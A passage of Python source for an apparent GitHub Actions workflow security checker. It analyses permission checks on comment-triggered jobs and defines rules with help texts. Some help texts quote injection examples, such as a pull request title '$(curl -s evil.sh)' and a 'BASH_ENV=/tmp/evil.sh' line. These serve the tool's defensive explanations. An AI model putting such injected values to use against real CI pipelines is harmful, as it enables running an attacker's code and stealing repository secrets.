        inline[name] = script[expr.start : expr.end]
        parts += [script[pos : expr.start], "${" + name + "}"]
        pos = expr.end
    texts = {**_DEFAULT_ENV, **dict(env), **inline}
    variables = {
        association: {name: stranger_text(text, association) for name, text in texts.items()}
        for association in UNTRUSTED_ASSOCIATIONS
    }
    return "".join(parts) + script[pos:], variables


@lru_cache(maxsize=1024)
def _shell_passing(script: str, env: tuple[tuple[str, str], ...]) -> tuple[str, ...]:
    """``_shell_check`` for a script and its ``env:`` values (cached: the rules ask often)."""
    body, variables = _shell_run(script, env)
    return tuple(association for association, values in variables.items() if not always_fails(body, values))


@lru_cache(maxsize=1024)
def _api_verdict(script: str, env: tuple[tuple[str, str], ...]) -> bool | None:
    """Whether a script that asks the permission API about the commenter exits for every
    stranger (``shell.api_fails``); None if the evaluator doesn't follow it."""
    body, variables = _shell_run(script, env)
    verdicts = [api_fails(body, values) for values in variables.values()]
    return None if None in verdicts else all(verdicts)


def _denies(step: Step, answers: list[Step]) -> bool:
    """``step`` fails whenever it runs (``exit 1``, ``core.setFailed``...), and its ``if:`` reads
    the answer of the permission steps ``answers`` and is true for every answer a commenter who
    can't write gets: the "exit if no write permission" step after an action that only reports
    (``if: steps.perm.outputs.require-result != 'true'`` then ``run: exit 1``)."""
    if _continues(step) or not _reads_steps(_if_paths(step.node), _step_ids(answers)):
        return False
    if not _ALWAYS_FAILS.search((scalar(get(step.node, "run")) or "") + (step.with_value("script") or "")):
        return False
    try:
        return all(must_pass(_if_text(step.node), lookup) for _, lookup in _no_answers(answers))
    except ExpressionError:
        return False


def _answers(wf: Workflow, job_id: str) -> list[Step]:
    """The job's steps that ask for the commenter's permission but don't fail on a no, and the
    scripts that look at who commented and write the answer to ``$GITHUB_OUTPUT``."""
    return [step for step in _job_steps(wf, job_id) if _is_answer(step)]


def _is_answer(step: Step) -> bool:
    check = _permission_check(step)
    return check == _REPORTS or (check is None and _script_answers(step) is not None)


def _askers(wf: Workflow, job_id: str) -> list[Step]:
    """The job's steps that ask for the commenter's permission, whether they fail on a no or
    not (a step that fails may still write the answer to an output first), and the scripts
    that report who commented."""
    return [
        step
        for step in _job_steps(wf, job_id)
        if _permission_check(step) is not None or _script_answers(step) is not None
    ]


def _script_answers(step: Step) -> list[dict[str, object]] | None:
    """For a bash ``run:`` script that looks at who commented (``${{ }}``, its ``env:``,
    ``$GITHUB_ACTOR`` or the permission API): what it writes to ``$GITHUB_OUTPUT`` for a
    stranger on each path where it succeeds (``shell.script_outputs``, every association that
    can't write). None if it doesn't look, writes nothing, never succeeds, has
    ``continue-on-error`` or isn't followed. A github-script that looks at who commented: its
    ``core.setOutput`` and ``result`` outputs (``jscript.run``)."""
    if _is_github_script(step):
        results = None if _continues(step) or not _js_looks(step) else _js_results(step)
        if results is None:
            return None
        maps = [m for result in results for m in result.outputs]
        maps = [m for i, m in enumerate(maps) if m not in maps[:i]]
        writes = any(key != "result" or value != "" for m in maps for key, value in m.items())
        return maps if maps and writes else None
    run = scalar(get(step.node, "run"))
    shell = (scalar(get(step.node, "shell")) or "bash").split()[0].lower()
    if not run or shell not in ("bash", "sh") or _continues(step):
        return None
    env = {k: v.value for k, v in items(get(step.node, "env")) if isinstance(v, ScalarNode)}
    texts = [run, *env.values()]
    looks = (
        any(_mentions(_paths(expr), _COMMENTER) for text in texts for expr in find_expressions(text))
        or re.search(r"\$\{?GITHUB_(?:TRIGGERING_)?ACTOR\b", run) is not None
        or _PERMISSION_API.search(run) is not None
    )
    if not looks:
        return None
    return _script_maps(run, tuple(sorted(env.items())))


@lru_cache(maxsize=1024)
def _script_maps(script: str, env: tuple[tuple[str, str], ...]) -> list[dict[str, object]] | None:
    body, variables = _shell_run(script, env)
    maps: list[dict[str, object]] = []
    for values in variables.values():
        found = script_outputs(body, values)
        if found is None:
            return None
        maps += [m for m in found if m not in maps]
    return maps if maps and any(maps) else None


def _step_ids(steps: list[Step]) -> set[str]:
    return {(scalar(get(step.node, "id")) or "").lower() for step in steps} - {""}


def _reads_steps(paths: list[ContextPath], ids: set[str]) -> bool:
    """One of ``paths`` is ``steps.<id>...`` for one of ``ids``."""
    return any(path.segments[0] == "steps" and path.segments[1:2] in {(i,) for i in ids} for path in paths)


Lookup = Callable[[tuple[str, ...]], object]


def _possible_answers(step: Step, output: str) -> tuple[str, ...]:
    """What output ``output`` of permission step ``step`` may say to a commenter who can't
    write: ``NO_ANSWERS``, or fewer for a known action's output that is never empty."""
    action = (step.uses or "").split("@", 1)[0].lower()
    known = _ACTION_ANSWERS.get(action, {}).get(output)
    if known is not None and (not known[1] or (step.with_value(known[1]) or "").strip()):
        return known[0]
    return NO_ANSWERS


_SCRIPT = "\0script"  # the label of a lookup when only scripts' outputs answer
_MAX_COMBINATIONS = 64


def _no_answers(steps: list[Step]) -> list[tuple[str, Lookup]]:
    """For each answer in ``NO_ANSWERS``: the ``steps.<id>`` values of these permission steps
    (which don't stop the job) for a commenter who can't write. A step that would fail but has
    ``continue-on-error`` has the outcome ``failure``; the others succeed. An output that can't
    give that answer (see ``_possible_answers``) gives its first possible one instead, so every
    lookup is one a commenter can really meet. Each lookup notes in its ``seen`` dict whether it
    gave its own answer ("said") or a stand-in ("swapped"), for ``_passing``.

    A script whose outputs are known (``_script_answers``) gives each of them in turn instead
    (every combination with the other scripts); the lookup notes the ``name=value`` it gave in
    ``seen["outputs"]``. With only such scripts there is one label, ``_SCRIPT``. A script that
    asks the permission API but writes an output the evaluator can't work out keeps the answers
    in ``NO_ANSWERS`` (what such an output says to a no)."""
    by_id = {(scalar(get(step.node, "id")) or "").lower(): step for step in steps}
    by_id.pop("", None)
    outcomes = {key: "failure" if _asks(step) else "success" for key, step in by_id.items()}
    scripted = {
        key: maps
        for key, step in by_id.items()
        if (maps := _script_answers(step)) is not None
        and not (_permission_check(step) and any(v is UNKNOWN for m in maps for v in m.values()))
    }
    if math.prod(len(maps) for maps in scripted.values()) > _MAX_COMBINATIONS:
        scripted = {}
    labels = NO_ANSWERS if set(by_id) - set(scripted) or not scripted else (_SCRIPT,)
    combinations = [dict(zip(scripted, combo, strict=True)) for combo in product(*scripted.values())]

    def lookup_for(answer: str, written: dict[str, dict[str, object]]) -> Lookup:
        seen: dict[str, object] = {}

        def lookup(path: tuple[str, ...]) -> object:
            if len(path) > 2 and path[0] == "steps" and path[1] in outcomes:
                if path[2] == "outputs":
                    if len(path) < 4:
                        return UNKNOWN
                    if path[1] in written:
                        value = written[path[1]].get(path[3], "")
                        if isinstance(value, str):
                            seen.setdefault("outputs", set()).add(f"{path[3]}={value}")  # type: ignore[union-attr]
                        return value
                    possible = _possible_answers(by_id[path[1]], path[3])
                    seen["said" if answer in possible else "swapped"] = True
                    return answer if answer in possible else possible[0]
                if path[2] == "outcome":
                    return outcomes[path[1]]
                if path[2] == "conclusion":
                    return "success"
            return UNKNOWN

        lookup.seen = seen  # type: ignore[attr-defined]
        return lookup

    return [(label, lookup_for(label, written)) for label in labels for written in combinations]


def _passing(node: Node | None, lookups: list[tuple[str, Lookup]]) -> list[tuple[str, Lookup]]:
    """The lookups (with their answers) for which the ``if:`` of ``node`` may be true (all, if
    it isn't an expression). An answer that no output it reads can give (every one it read was
    a stand-in) isn't named: its stand-in is named for itself."""
    text = _if_text(node)
    try:
        passing = [(answer, lookup) for answer, lookup in lookups if may_pass(text, lookup)]
    except ExpressionError:
        return lookups
    return [(answer, lookup) for answer, lookup in passing if _said(lookup)]


def _said(lookup: Lookup) -> bool:
    seen = getattr(lookup, "seen", {})
    return bool(seen.get("said")) or not seen.get("swapped")


def _answer_words(passing: list[tuple[str, Lookup]]) -> str:
    """``passing`` answers to follow "when it answers": the answers, or for scripts the
    ``name=value`` outputs they write."""
    answers = list(dict.fromkeys(answer for answer, _ in passing))
    if answers == [_SCRIPT]:
        written: set[str] = set()
        for _, lookup in passing:
            written |= getattr(lookup, "seen", {}).get("outputs", set())
        words = [f"'{output}'" for output in sorted(written)]
        if not words:
            return "anything"
    elif len(answers) == len(NO_ANSWERS):
        return "anything"
    else:
        words = ["nothing" if answer == "" else f"'{answer}'" for answer in answers]
    return ", ".join(words[:-1]) + (" or " if len(words) > 1 else "") + words[-1] if words else ""


def _answer_gate(node: Node | None, steps: list[Step]) -> tuple[bool, str]:
    """Whether the ``if:`` of ``node`` reads the answer of the permission steps ``steps`` and is
    false for every answer a commenter who can't write gets, and if it reads the answer but
    doesn't, which answers still pass (to follow "when it answers")."""
    if not _reads_steps(_if_paths(node), _step_ids(steps)):
        return False, ""
    passing = _passing(node, _no_answers(steps))
    return not passing, _answer_words(passing)


def _output_text(value: str, lookup: Lookup) -> object:
    """The text of a job output written as ``value``, or UNKNOWN."""
    parts, pos = [], 0
    for expr in find_expressions(value):
        try:
            text = text_value(expr.inner, lookup)
        except ExpressionError:
            return UNKNOWN
        if text is UNKNOWN:
            return UNKNOWN
        parts += [value[pos : expr.start], str(text)]
        pos = expr.end
    return "".join(parts) + value[pos:]


def _silent_ids(wf: Workflow, job_id: str) -> set[str]:
    """The ids of the job's steps that never run for a commenter who can't write (their
    ``if:`` checks who commented, or the answer of a permission step before them): their
    outputs are empty for such a commenter."""
    answers = _answers(wf, job_id)
    return _step_ids(
        [
            step
            for step in _job_steps(wf, job_id)
            if _commenter_gate(step.node)[0] or _answer_gate(step.node, answers)[0]
        ]
    )


def _answer_outputs(wf: Workflow, job_id: str) -> dict[str, str]:
    """The job's outputs (names in lower case) that carry a permission step's answer, or the
    output of a step that never runs for a stranger, with their values as written."""
    ids = _step_ids(_askers(wf, job_id)) | _silent_ids(wf, job_id)
    outputs = get(dict(wf.jobs()).get(job_id), "outputs")
    return {
        key.lower(): value.value
        for key, value in items(outputs)
        if isinstance(value, ScalarNode)
        and any(_reads_steps(_paths(expr), ids) for expr in find_expressions(value.value))
    }


def _needed_answer_gate(wf: Workflow, job: Node | None, name: str) -> tuple[bool, str]:
    """Like ``_answer_gate``, for a job's ``if:`` that reads the answer of a permission step in
    job ``name`` (one it needs) through ``needs.<name>.outputs``."""
    outputs = _answer_outputs(wf, name)
    paths = _if_paths(job)
    if not any(_mentions(paths, (("needs", name.lower(), "outputs", out),)) for out in outputs):
        return False, ""
    lookups: list[tuple[str, Lookup]] = []
    silent = _silent_ids(wf, name)
    for answer, inner in _no_answers(_askers(wf, name)):

        def quiet(path: tuple[str, ...], inner: Lookup = inner) -> object:
            if len(path) > 3 and path[0] == "steps" and path[1] in silent and path[2] == "outputs":
                return ""  # a step that didn't run writes nothing
            return inner(path)

        values = {
            ("needs", name.lower(), "outputs", out): _output_text(raw, quiet) for out, raw in outputs.items()
        }

        def outer(path: tuple[str, ...], values: dict[tuple[str, ...], object] = values) -> object:
            return values.get(path, UNKNOWN)

        outer.seen = getattr(inner, "seen", {})  # type: ignore[attr-defined]
        lookups.append((answer, outer))
    passing = _passing(job, lookups)
    return not passing, _answer_words(passing)


def _runs_anyway(
    node: Node | None, results: dict[str, str] | None = None, wf: Workflow | None = None
) -> tuple[str, ...]:
    """The status functions (``always``, ``failure``...) through which the ``if:`` of ``node``
    may still be true for a commenter who can't write: for a step, after an earlier step failed
    on their no; for a job (``results`` and ``wf`` given), after the needed jobs in ``results``
    failed or were skipped for them (name -> "failure" or "skipped"). Empty if it isn't (an
    ``if:`` without a status function gets ``success() &&`` in front of it, so it never runs
    then)."""
    text = _if_text(node)
    try:
        functions = status_functions(text) if text else ()
    except ExpressionError:
        return ()  # GitHub doesn't start a workflow whose 'if:' isn't an expression
    if not functions:
        return ()
    status: dict[tuple[str, ...], object] = {
        ("success()",): False,
        ("failure()",): True,
        ("cancelled()",): UNKNOWN,  # another comment can cancel the run (concurrency)
    }
    if results is not None and wf is not None:
        status[("failure()",)] = _failure_after(wf, node, results)
        for name, result in results.items():
            status[("needs", name.lower(), "result")] = result
            if result == "skipped":  # a skipped job sets no outputs
                status.update({path: "" for path in _output_paths(node, name)})
    return functions if may_pass(text, lambda path: status.get(path, UNKNOWN)) else ()


def _failure_after(wf: Workflow, job: Node | None, results: dict[str, str]) -> object:
    """``failure()`` in a job whose needed jobs ended as in ``results``: true if one failed,
    false if all of them were skipped and none needs another job (so nothing failed before
    them), else unknown."""
    if "failure" in results.values():
        return True
    needs = _needs(job)
    if all(name in results for name in needs) and not any(_needed_jobs(wf, name) for name in needs):
        return False
    return UNKNOWN


def _needed_results(wf: Workflow, job_id: str, seen: frozenset[str] = frozenset()) -> dict[str, str]:
    """How the jobs ``job_id`` needs end for a commenter who can't write, for the ones that
    don't succeed for them (see ``_stranger_result``). A needed job with a stop that may be
    skipped counts as failing when this job's ``if:`` has the stop's condition, read through
    the needed job's outputs: when the stop is skipped, this job is skipped too."""
    job = dict(wf.jobs()).get(job_id)
    results = {}
    for name in _needs(job):
        result = _stranger_result(wf, name, seen | {job_id})
        if result is None and any(_covers_through(wf, stop, name, job) for stop in _stops(wf, name)):
            result = "failure"
        if result is not None:
            results[name] = result
    return results


def _covers_through(wf: Workflow, stop: _Stop, name: str, job: Node | None) -> bool:
    """A stop in job ``name`` that may be skipped, whose condition ``job`` (which needs ``name``)
    has too: each ``steps.<id>.outputs.<x>`` in it read as the job output that carries exactly
    that value (``needs.<name>.outputs.<o>``)."""
    tree, has = _condition(stop.step.node), _conjuncts(job)
    if stop.sure or tree is None or has is None:
        return False
    carried = {}
    for key, value in items(get(dict(wf.jobs()).get(name), "outputs")):
        text = value.value.strip() if isinstance(value, ScalarNode) else ""
        exprs = list(find_expressions(text))
        if len(exprs) == 1 and exprs[0].start == 0 and exprs[0].end == len(text):  # exactly ${{ x }}
            try:
                inner = parse_condition(exprs[0].inner)
            except ExpressionError:
                continue
            if inner.kind == "path" and inner.value[0] == "steps":
                carried[inner.value] = ("needs", name.lower(), "outputs", key.lower())

    def through(part: ConditionNode) -> ConditionNode:
        # A steps.* path that no output carries stays as it is: a job's if: can't read steps,
        # so a part with one never matches.
        if part.kind == "path":
            return replace(part, value=carried.get(part.value, part.value))
        return replace(part, children=tuple(through(child) for child in part.children))

    return _parts(through(tree)) <= has


def _output_paths(node: Node | None, needed: str) -> list[tuple[str, ...]]:
    prefix = ("needs", needed.lower(), "outputs")
    return [p.segments for p in _if_paths(node) if p.segments[:3] == prefix and len(p.segments) == 4]


def _function_words(functions: tuple[str, ...]) -> str:
    words = [f"{name}()" for name in functions]
    return ", ".join(words[:-1]) + (" and " if len(words) > 1 else "") + words[-1]


def _stranger_result(wf: Workflow, job_id: str, seen: frozenset[str] = frozenset()) -> str | None:
    """How job ``job_id`` ends for a commenter who can't write: "skipped" (its ``if:``, or a job
    it needs, keeps them out), "failure" (a step fails on their no) or None (it may succeed)."""
    if _job_checks_commenter(wf, job_id, seen):
        return "skipped"
    return "failure" if _stop_step(wf, job_id) is not None else None


def _needs(job: Node | None) -> list[str]:
    needs = get(job, "needs")
    if isinstance(needs, ScalarNode):
        return [needs.value]
    if isinstance(needs, SequenceNode):
        return [n.value for n in needs.value if isinstance(n, ScalarNode)]
    return []


def _job_checks_commenter(wf: Workflow, job_id: str, seen: frozenset[str] = frozenset()) -> bool:
    """The job's ``if:`` checks who commented, or reads the answer of a permission step in a
    job it ``needs:`` so that it's false for a no, or a job it needs (directly or further up)
    checks or has a step that fails on a no, and this job's ``if:`` doesn't run it anyway
    (``always()``, ``failure()``, ``!cancelled()``...) when that job fails or is skipped."""
    job = dict(wf.jobs()).get(job_id)
    if job is None or job_id in seen:
        return False
    if _commenter_gate(job)[0]:
        return True
    if any(_needed_answer_gate(wf, job, name)[0] for name in _needs(job)):
        return True
    results = _needed_results(wf, job_id, seen)
    return bool(results) and not _runs_anyway(job, results, wf)


def _needed_jobs(wf: Workflow, job_id: str) -> list[str]:
    """Every job ``job_id`` needs, directly or further up, nearest first."""
    jobs = dict(wf.jobs())
    found: list[str] = []
    queue = _needs(jobs.get(job_id))
    while queue:
        name = queue.pop(0)
        if name in found or name == job_id or name not in jobs:
            continue
        found.append(name)
        queue.extend(_needs(jobs[name]))
    return found


def _checks_out_pr(step: Step) -> bool:
    if (step.uses or "").startswith("actions/checkout@"):
        for key in ("ref", "repository"):
            value = step.with_value(key) or ""
            if "refs/pull/" in value or any(
                _mentions(_paths(expr), _PR_REF) for expr in find_expressions(value)
            ):
                return True
        return False
    return _pr_script(scalar(get(step.node, "run")) or "")


def _uses_secrets(node: Node, skip: tuple[Node, ...] = ()) -> bool:
    """``${{ secrets.X }}`` anywhere in ``node`` outside ``skip``, other than the GITHUB_TOKEN."""
    return any(
        path.segments[0] == "secrets" and path.segments[1:2] != ("github_token",)
        for text in _scalars(node, skip)
        for expr in find_expressions(text.value)
        for path in _paths(expr)
    )


def _why_open(
    wf: Workflow,
    job_id: str,
    what: str,
    *nodes: Node | None,
    stop: Step | None = None,
    anyway: tuple[str, ...] = (),
    skipped: bool = False,
) -> str:
    """Why the checks that are there don't cover the reported ``what`` ("step" or "job"): a
    permission step that comes too late (or that a step runs after anyway, through the status
    functions ``anyway``), a needed job that stops a no but this job runs anyway, a weak ``if:``
    (its own, then a needed job's), a permission step whose answer it doesn't check (or checks
    but lets a no through), or an ``if:`` on the comment's text."""
    if stop is not None:
        line = stop.node.start_mark.line + 1
        if anyway:
            who = "this step's 'if:'" if what == "step" else "the 'if:' of a step that uses secrets"
            late = f"{who} uses {_function_words(anyway)}, so it runs even when that step fails"
        elif skipped:
            who = "this step" if what == "step" else "a step that uses secrets"
            late = f"its 'if:' may skip it, and {who} doesn't have the same condition"
        elif what == "step":
            late = "this step runs before it"
        else:
            late = "the steps that use secrets run before it"
        return f" (the step at line {line} fails unless the commenter may write, but {late})"
    jobs = dict(wf.jobs())
    job = jobs.get(job_id)
    results = _needed_results(wf, job_id)
    functions = _runs_anyway(job, results, wf) if results else ()
    if functions:
        name, result = next(iter(results.items()))
        how = "fails" if result == "failure" else "is skipped"
        return (
            f" (job '{name}', which it needs, {how} for commenters who can't write, but this"
            f" job's 'if:' uses {_function_words(functions)}, so it runs anyway)"
        )
    for node in nodes:
        note = _weak_note(node, "its 'if:'")
        if note:
            return note
    needed = _needed_jobs(wf, job_id)
    for name in needed:
        note = _weak_note(jobs[name], f"the 'if:' of job '{name}', which it needs,")
        if note:
            return note
    for name in (job_id, *needed):
        for step in _job_steps(wf, name):
            script = scalar(get(step.node, "run")) or ""
            tries = _permission_check(step) is None and _ALWAYS_FAILS.search(script)
            passing = _shell_check(wf, step) if tries else None  # a script that tries to stop someone
            if passing:
                where = "" if name == job_id else f" in job '{name}', which it needs,"
                line = step.node.start_mark.line + 1
                who = _who(passing, _shell_inputs(wf, step, (ASSOCIATION,)) is not None)
                return f" (the script at line {line}{where} looks at who commented but still lets {who})"
    for name in (job_id, *needed):
        steps = _answers(wf, name)
        if not steps:
            continue
        line = steps[0].node.start_mark.line + 1
        asks = (
            "asks for the commenter's permission" if _permission_check(steps[0]) else "looks at who commented"
        )
        if name == job_id:
            who = next((w for w in (_answer_gate(node, steps)[1] for node in nodes) if w), "")
            check = f"is still true when it answers {who}" if who else "doesn't check its answer"
            return (
                f" (the step at line {line} {asks} but doesn't fail on a no, and this {what}'s 'if:' {check})"
            )
        who = _needed_answer_gate(wf, jobs[job_id], name)[1]
        check = (
            f"reads the answer in needs.{name}.outputs but is still true when it answers {who}"
            if who
            else f"doesn't check the answer in needs.{name}.outputs"
        )
        return (
            f" (the step at line {line} in job '{name}', which it needs, {asks} but doesn't fail"
            f" on a no, and this job's 'if:' {check})"
        )
    if any(_mentions(_if_paths(node), _COMMENT_BODY) for node in nodes):
        return " (its 'if:' only looks at the comment's text, which anyone can write)"
    return ""


_ASK = (
    "check github.event.comment.author_association (OWNER, MEMBER, COLLABORATOR) in the job's"
    " 'if:', or the commenter's permission in a first step"
)


def comment_commands(wf: Workflow) -> Iterator[Finding]:
    if wf.is_action or "issue_comment" not in wf.triggers():
        return
    for job_id, job in wf.jobs():
        if _job_checks_commenter(wf, job_id):
            continue
        steps = _job_steps(wf, job_id)
        stops = _stops(wf, job_id)
        stop_ids = {id(stop.step.node) for stop in stops}
        # A step after a stop that covers it only runs for people who may write, unless its
        # 'if:' runs it after a failure too (always(), failure()...).
        anyway: dict[int, tuple[str, ...]] = {}
        before: dict[int, _Stop] = {}  # the first stop before a step, for the message
        open_steps = []
        answers = _answers(wf, job_id)
        for j, step in enumerate(steps):
            prior = [stop for stop in stops if stop.index < j]
            if prior:
                before[id(step.node)] = prior[0]
                anyway[id(step.node)] = _runs_anyway(step.node)
            if id(step.node) in stop_ids or _permission_check(step) is not None:
                continue  # the check itself (it may need a token to ask the API)
            if not anyway.get(id(step.node)) and any(_covers(stop, step) for stop in prior):
                continue
            if not (_commenter_gate(step.node)[0] or _answer_gate(step.node, answers)[0]):
                open_steps.append(step)
        first = stops[0].step if stops else None
        reported = False
        for step in open_steps:
            if not _checks_out_pr(step):
                continue
            reported = True
            after = before.get(id(step.node))
            why = _why_open(
                wf,
                job_id,
                "step",
                job,
                step.node,
                stop=after.step if after else first,
                anyway=anyway.get(id(step.node), ()),
                skipped=after is not None,
            )
            yield _at(
                wf,
                step.node,
                "WG010",
                Severity.HIGH,
                "checks out the pull request's code in a job that anyone who can comment can"
                " start ('issue_comment' runs with secrets and a write token), without checking"
                f" who commented{why}; {_ASK}",
            )
        if reported:
            continue
        late: tuple[str, ...] = ()
        skipped = False
        stop = first
        if stops:
            leaking = [step for step in open_steps if _uses_secrets(step.node)]
            secrets = bool(leaking)
            if leaking and all(id(step.node) in before for step in leaking):
                stop = before[id(leaking[0].node)].step
                late = anyway[id(leaking[0].node)]
                skipped = not late
        else:
            open_ids = {id(step.node) for step in open_steps}
            secrets = _uses_secrets(job, tuple(s.node for s in steps if id(s.node) not in open_ids))
        if secrets:
            yield _at(
                wf,
                key_node(get(wf.root, "jobs"), job_id) or job,
                "WG010",
                Severity.MEDIUM,
                f"job '{job_id}' uses secrets and anyone who can comment can start it"
                f" ('issue_comment'), without a check of who commented"
                f"{_why_open(wf, job_id, 'job', job, stop=stop, anyway=late, skipped=skipped)}; {_ASK}",
            )


RULES: tuple[Rule, ...] = (
    Rule(
        "WG001",
        "unpinned-action",
        "Actions and reusable workflows not pinned to a commit SHA",
        unpinned_actions,
        help=(
            "A tag or branch such as @v4 can be moved to different code after you've reviewed it; a "
            "full 40-character commit SHA can't. Pin with uses: owner/repo@<sha>  # v4 (workflow-"
            "guard --fix does this)."
        ),
    ),
    Rule(
        "WG002",
        "missing-permissions",
        "No explicit GITHUB_TOKEN permissions",
        missing_permissions,
        help=(
            "Without permissions: the GITHUB_TOKEN gets the repository's default, which may be "
            "read/write for everything. Add permissions: contents: read at the top and widen it per "
            "job only where needed."
        ),
    ),
    Rule(
        "WG003",
        "write-all",
        "'permissions: write-all'",
        write_all,
        help=(
            "write-all gives every step a token that can push code, create releases and change "
            "issues. List only the scopes the job needs."
        ),
    ),
    Rule(
        "WG004",
        "template-injection",
        "Untrusted ${{ }} values (or inputs from unknown callers) inside run:, github-script or"
        " an action's script input",
        template_injection,
        help=(
            "${{ }} values are pasted into the script before it runs, so a pull request title like "
            '$(curl -s evil.sh) runs as code. Pass the value through env: and use "$VAR" in the '
            "script instead. In a composite action or reusable workflow the same goes for "
            "${{ inputs.* }}: the calling workflow may pass untrusted text. Actions that run an "
            "input as a script (appleboy/ssh-action's script, azure/cli's inlineScript, ...) are "
            "checked too."
        ),
    ),
    Rule(
        "WG005",
        "pull-request-target",
        "pull_request_target, especially with a checkout of the PR",
        pull_request_target,
        help=(
            "pull_request_target runs with secrets and a write token even for pull requests from "
            "forks. Never check out and run the pull request's code in it; use pull_request instead "
            "where possible."
        ),
    ),
    Rule(
        "WG006",
        "persisted-credentials",
        "actions/checkout without persist-credentials: false",
        persisted_credentials,
        help=(
            "actions/checkout stores the token in .git/config, where every later step (and anything "
            "it downloads) can read it. Set persist-credentials: false unless a step pushes."
        ),
    ),
    Rule(
        "WG007",
        "untrusted-github-env",
        "Untrusted text written to $GITHUB_ENV or $GITHUB_PATH",
        untrusted_github_env,
        help=(
            "Every later step of the job reads $GITHUB_ENV and $GITHUB_PATH. A pull request title "
            "with a line break such as 'x\\nBASH_ENV=/tmp/evil.sh' then sets a variable that makes "
            "bash run the sender's script; $GITHUB_PATH can put their directory first in PATH. "
            "Pass the value to the step that needs it through env: or a step output instead."
        ),
    ),
    Rule(
        "WG008",
        "secrets-exposure",
        "Secrets pasted into scripts, toJSON(secrets), or 'secrets: inherit' to another repository",
        secrets_exposure,
        help=(
            "${{ secrets.X }} inside run: becomes part of the script text, where quotes break it and "
            'logs or process listings can show it; pass it through env: and use "$X". '
            "toJSON(secrets) and 'secrets: inherit' to a reusable workflow in another repository "
            "hand out every secret at once; pass only the ones needed."
        ),
    ),
    Rule(
        "WG009",
        "workflow-run",
        "workflow_run that checks out or downloads artifacts of the triggering run",
        workflow_run,
        help=(
            "A workflow_run workflow runs with secrets and a write token, but the run that triggered "
            "it may have built a fork's pull request: its commit and its artifacts are the fork "
            "author's. Don't check out that commit. Download artifacts to ${{ runner.temp }}, not "
            "the workspace, and treat them as data: never run, source or paste them into scripts."
        ),
    ),
    Rule(
        "WG010",
        "comment-command",
        "issue_comment jobs that check out the PR or use secrets without checking the commenter",
        comment_commands,
        help=(
            "issue_comment runs with secrets and a write token, and anyone who can comment on an "
            "issue or pull request (on a public repository: anyone) starts it. A '/deploy' or '/test' "
            "command must check who commented: github.event.comment.author_association in "
            "(OWNER, MEMBER, COLLABORATOR) in the job's if:, or the commenter's permission through "
            "the API. Matching the comment's text is not a check."
        ),
    ),
)
RULE_IDS = frozenset(r.id for r in RULES)


def check(wf: Workflow, ignore: frozenset[str] = frozenset()) -> list[Finding]:
    """All findings for one workflow, minus ignored rules and inline ``ignore[...]`` comments."""
    found: list[Finding] = []
    for rule in RULES:
        if rule.id in ignore:
            continue
        for finding in rule.check(wf):
            if not wf.is_ignored(finding.line, finding.rule_id):
                found.append(finding)
    return sorted(found)
